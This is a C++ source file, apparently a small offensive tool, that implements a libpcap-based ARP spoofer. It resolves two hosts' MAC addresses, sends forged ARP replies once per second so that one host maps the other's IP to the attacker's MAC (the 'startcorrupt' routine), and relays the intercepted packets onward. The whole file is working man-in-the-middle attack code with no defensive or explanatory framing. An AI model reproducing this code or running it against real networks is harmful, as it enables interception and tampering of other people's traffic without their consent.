#include<iostream>
#include<thread>
#include<cstring>
#include<stdio.h>
#include<unistd.h>
#include<pcap/pcap.h>
#include<arpa/inet.h>
#include<sys/ioctl.h>
#include<sys/socket.h>
#include<net/if.h>
#include"Header.h"
#include"arpspoofer.h"
using namespace std;
ARPSpoofer::ARPSpoofer(const char *dev, const char *txipaddr, const char *rxipaddr)
{
    this->dev = dev;
    memset(&Myipaddr,0x00,sizeof(Myipaddr));
    memset(Myhwaddr,0x00,sizeof(Myhwaddr));

    getmyaddr();
    inet_pton(AF_INET,rxipaddr,&RXipaddr);
    inet_pton(AF_INET,txipaddr,&TXipaddr);

    memset(RXhwaddr,0x00,sizeof(RXhwaddr));
    memset(TXhwaddr,0x00,sizeof(TXhwaddr));
    gethwaddr(&TXipaddr,TXhwaddr);
    gethwaddr(&RXipaddr,RXhwaddr);
}

void ARPSpoofer::getmyaddr(void)
{
    int s;
    struct ifreq buffer;
    s = socket(AF_INET,SOCK_DGRAM,0);
    memset(&buffer,0x00,sizeof(buffer));
    buffer.ifr_addr.sa_family = AF_INET;
    strncpy(buffer.ifr_name,dev,IFNAMSIZ-1);
    // hw
    if(ioctl(s,SIOCGIFHWADDR, &buffer)<0)
    {
        perror("ioctl");
        exit(3);
    }
    memcpy(Myhwaddr,buffer.ifr_hwaddr.sa_data,ETH_ALEN);
    // ip
    if(ioctl(s,SIOCGIFADDR,&buffer)<0)
    {
        perror("ioctl");
        exit(4);
    }
    memcpy(&Myipaddr,&(((struct sockaddr_in *)&buffer.ifr_addr)->sin_addr),sizeof(struct in_addr));
    close(s);

}
void ARPSpoofer::recvarp(const char* dev,in_addr *srcip, uint8_t *srchw,\
                          in_addr *dstip, uint8_t *dsthw, const char* filter)
{
    pcap_t *handle;
    struct bpf_program fp;
    bpf_u_int32 mask,net;
    struct pcap_pkthdr *header;
    const u_char *packet;
    char errbuf[PCAP_ERRBUF_SIZE];
    int ret;

    if(pcap_lookupnet(dev,&net,&mask,errbuf) == -1)
    {
        cout << "[!] pcap_lookupnet " << errbuf << endl;
        return;
    }
    if((handle=pcap_open_live(dev,BUFSIZ,1,1000,errbuf))==NULL)
    {
        cout << "[!] pcap_open_live " << errbuf << endl;
        return;
    }
    if(pcap_compile(handle,&fp,filter,0,net) == -1)
    {
        cout << "[!] pcap_compile " << pcap_geterr(handle) << endl;
        return;
    }
    if(pcap_setfilter(handle,&fp) == -1)
    {
        cout << "[!] pcap_setfilter " << pcap_geterr(handle) << endl;
        return;
    }

    while(true)
    {
        if((ret = pcap_next_ex(handle,&header,&packet)) == -1)
        {
            cout << "[!] pcap_next_ex " << pcap_geterr(handle) << endl;
            break;
        }
        if(ret == 0)
            continue;
        arp_header *arph = (arp_header*)(packet+sizeof(ether_header));
        if(ntohs(arph->arp_op) == ARP_REPLY)
        {
            if((arph->arp_destpaddr == srcip->s_addr) \
                    && (!memcmp(arph->arp_desthaddr,srchw,6)) \
                    && (arph->arp_srpaddr == dstip->s_addr))
            {
                memcpy(dsthw,arph->arp_srhaddr,6);
                break;
            }
        }

    }
    pcap_close(handle);
    return;

}
void ARPSpoofer::sendarp(in_addr *srcip, uint8_t *srchw,\
                          in_addr *dstip, uint8_t *dsthw)
{
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    u_char buffer[BUFSIZE-1] = {0};
    ether_header *eth;
    arp_header *arph;
    if((handle=pcap_open_live(dev,BUFSIZ,1,1000,errbuf))==NULL)
    {
        cout << "[!] pcap_open_live " << errbuf << endl;
        return;
    }
    eth = (ether_header*)buffer;
    memcpy(eth->eth_src,srchw,6);
    memcpy(eth->eth_dst,"\xff\xff\xff\xff\xff\xff",6);
    eth->eth_type = htons(ETHERTYPE_ARP);
    arph = (arp_header*)&buffer[sizeof(ether_header)];
    arph->arp_htype = htons(ARP_ETHER);
    arph->arp_ptype = htons(ARP_IP);
    arph->arp_hlen = ARP_ETHERL;
    arph->arp_plen = ARP_IPL;
    arph->arp_op = htons(ARP_REQUEST);
    memcpy(arph->arp_srhaddr,srchw,6);
    arph->arp_srpaddr = srcip->s_addr;
    memcpy(arph->arp_desthaddr,dsthw,6);
    arph->arp_destpaddr = dstip->s_addr;
    if(pcap_sendpacket(handle,buffer,sizeof(ether_header)+sizeof(arp_header))!=0)
    {
        cout << "[!] pcap_sendpacket " << endl;
        return;
    }
    return;
}

void ARPSpoofer::gethwaddr(struct in_addr* targetip,uint8_t* targethw)
{
    char filter_exp[100]={0};
    char srchwbuf[100]={0};
    int i;
    for(i=0;i<6;i++)
        sprintf(srchwbuf,"%s%02X%c",srchwbuf,Myhwaddr[i],(i==5)? ' ':':');
    sprintf(filter_exp,"ether dst %s&& ether proto \\arp",srchwbuf);
    thread th(&recvarp,dev,&Myipaddr,Myhwaddr,targetip,targethw,filter_exp);
    sendarp(&Myipaddr,Myhwaddr,targetip,targethw);
    th.join();
}
void ARPSpoofer::intelligentsendarp(pcap_t* rhandle, pcap_t* shandle, u_char* sendpacket)
{
    struct pcap_pkthdr *header;
    const u_char *packet;
    ether_header *eth;
    arp_header *arph;
    int ret;

    while(true)
    {
    /*    if((ret = pcap_next_ex(handle,&header,&packet)) == -1)
        {
            cout << "[!] pcap_next_ex " << pcap_geterr(handle) << endl;
            break;
        }
        if(ret == 0)
            continue;
        arp_header *arph = (arp_header*)(packet+sizeof(ether_header));*/

        if(pcap_sendpacket(shandle,sendpacket,sizeof(ether_header)+sizeof(arp_header))!=0)
        {
            cout << "[!] pcap_sendpacket " <<pcap_geterr(shandle) << endl;
            break;
        }
        sleep(1);
    }
    pcap_close(rhandle);
    pcap_close(shandle);

}

void ARPSpoofer::startcorrupt(void)
{
    pcap_t *rhandle;
    pcap_t *shandle;
    struct bpf_program fp;
    bpf_u_int32 mask,net;
    char errbuf[PCAP_ERRBUF_SIZE];
    ether_header *eth;
    arp_header *arph;
    u_char buffer[BUFSIZE-1] = {0};


    if(pcap_lookupnet(dev,&net,&mask,errbuf) == -1)
    {
        cout << "[!] pcap_lookupnet " << errbuf << endl;
        return;
    }
    if((rhandle=pcap_open_live(dev,BUFSIZ,1,1000,errbuf))==NULL)
    {
        cout << "[!] pcap_open_live " << errbuf << endl;
        return;
    }
    if((shandle=pcap_open_live(dev,BUFSIZ,1,1000,errbuf))==NULL)
    {
        cout << "[!] pcap_open_live " << errbuf << endl;
        return;
    }
    if(pcap_compile(rhandle,&fp,"ether proto \\arp",0,net) == -1)
    {
        cout << "[!] pcap_compile " << pcap_geterr(rhandle) << endl;
        return;
    }
    if(pcap_setfilter(rhandle,&fp) == -1)
    {
        cout << "[!] pcap_setfilter " << pcap_geterr(rhandle) << endl;
        return;
    }

    eth = (ether_header*)buffer;
    memcpy(eth->eth_src,Myhwaddr,6);
    memcpy(eth->eth_dst,TXhwaddr,6);
    eth->eth_type = htons(ETHERTYPE_ARP);
    arph = (arp_header*)&buffer[sizeof(ether_header)];
    arph->arp_htype = htons(ARP_ETHER);
    arph->arp_ptype = htons(ARP_IP);
    arph->arp_hlen = ARP_ETHERL;
    arph->arp_plen = ARP_IPL;
    arph->arp_op = htons(ARP_REPLY);
    memcpy(arph->arp_srhaddr,Myhwaddr,6);
    arph->arp_srpaddr = RXipaddr.s_addr;
    memcpy(arph->arp_desthaddr,TXhwaddr,6);
    arph->arp_destpaddr = TXipaddr.s_addr;
    cout << "as" << endl;
    thread th(&intelligentsendarp,rhandle,shandle,buffer);
    th.detach();
}
void ARPSpoofer::relayingpacket(pcap_t* handle, uint8_t* dsthw )
{
    struct pcap_pkthdr *header;
    const u_char *packet;
    ether_header *eth;
    ip_header *iph;
    int ret;

    while(true)
    {
        if((ret = pcap_next_ex(handle,&header,&packet)) == -1)
        {
            cout << "[!] pcap_next_ex " << pcap_geterr(handle) << endl;
            break;
        }
        if(ret == 0)
            continue;
        eth = (ether_header*)packet;
        iph = (ip_header*)(packet+sizeof(ether_header));
        memcpy(eth->eth_dst,dsthw,6);
        if(pcap_sendpacket(handle,packet,sizeof(ether_header)+ntohs(iph->ip_len))!=0)
        {
            cout << "[!] pcap_sendpacket " <<pcap_geterr(handle) << endl;
            break;
        }
    }
    pcap_close(handle);

}

void ARPSpoofer::startrelay(void)
{
    pcap_t *handle;
    struct bpf_program fp;
    bpf_u_int32 mask,net;
    char errbuf[PCAP_ERRBUF_SIZE];
    ether_header *eth;
    arp_header *arph;
    u_char buffer[BUFSIZE-1] = {0};
    char filter[100]={0};
    char srcipbuf[100]={0};
    inet_ntop(AF_INET,&TXipaddr.s_addr,srcipbuf,sizeof(srcipbuf));
    sprintf(filter,"ip src %s",srcipbuf);
    cout << filter << endl;

    if(pcap_lookupnet(dev,&net,&mask,errbuf) == -1)
    {
        cout << "[!] pcap_lookupnet " << errbuf << endl;
        return;
    }
    if((handle=pcap_open_live(dev,BUFSIZ,1,1000,errbuf))==NULL)
    {
        cout << "[!] pcap_open_live " << errbuf << endl;
        return;
    }
    if(pcap_compile(handle,&fp,filter,0,net) == -1)
    {
        cout << "[!] pcap_compile " << pcap_geterr(handle) << endl;
        return;
    }
    if(pcap_setfilter(handle,&fp) == -1)
    {
        cout << "[!] pcap_setfilter " << pcap_geterr(handle) << endl;
        return;
    }
    thread th(&relayingpacket,handle,RXhwaddr);
    th.join();
}
